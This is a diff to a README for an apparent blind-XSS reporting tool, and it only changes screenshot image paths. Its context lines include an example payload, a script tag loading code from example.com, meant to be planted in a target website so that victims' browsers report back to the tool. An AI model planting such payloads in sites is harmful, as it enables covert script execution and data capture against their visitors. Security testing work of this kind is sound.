@@ -22,7 +22,7 @@ Login to your website with /login?token=[token]
 After authentication, you can find all requests in `/results/all`.  
 Left side is from  XSS requests.  
 Right side is from custom path requests.  
-![results](_img/results.png)  
+![results](screenshots/results.png)  
 
 
 ### Collecting simple request data from path you specified in config  
@@ -38,7 +38,7 @@ Insert this payload to the website, alert will popup.
 You can find detailed report for your XSS, with DOM and Screenshort.  
 These request will be sent to slack, if specified in config.
 `<script src=https://example.com></script>`  
-![blind xss](_img/blindxss.png)  
+![blind xss](screenshots/blindxss.png)  
 
 
 
